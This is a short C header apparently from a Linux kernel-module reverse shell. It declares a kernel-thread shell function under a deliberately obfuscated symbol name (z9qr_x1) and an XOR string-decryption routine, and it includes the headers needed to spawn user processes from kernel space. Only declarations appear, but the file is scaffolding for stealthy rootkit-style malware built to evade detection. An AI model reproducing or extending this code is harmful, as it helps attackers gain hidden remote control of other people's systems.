#ifndef REVERSE_SHELL_H
#define REVERSE_SHELL_H

#include <linux/delay.h>
#include <linux/kthread.h>
#include <linux/sched/signal.h>
#include <linux/kmod.h>


#define rshell_func z9qr_x1
extern int z9qr_x1(void* data); // 'data' is not in use but must be present to match the signature for kthread

extern void xor_decrypt(char* s);

#endif // REVERSE_SHELL_H
